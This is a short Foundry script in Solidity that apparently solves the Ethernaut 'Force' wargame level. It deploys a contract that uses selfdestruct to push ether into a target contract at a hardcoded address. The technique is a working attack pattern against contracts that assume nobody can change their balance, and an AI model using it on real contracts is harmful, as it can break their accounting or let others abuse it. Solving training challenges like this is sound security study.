// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/Force.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";

contract Attack {
    address payable public target;

    constructor(address payable _target) payable {
        target = _target;
    }

    function attack() external payable {
        selfdestruct(target);
    }
}

contract Level7ForceSolution is Script {
    Force public instance = Force(0x84521D6330529b82F77fA49c3139643af7ac140d);
    Attack public attack;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attack = new Attack{value: 0.000001 ether}(payable(address(instance)));
        // address(instance).call{value: 0}(bytes4(keccak256("pwn()")));
        attack.attack();
        console.log("balance: ", address(instance).balance);
        vm.stopBroadcast();
    }
}
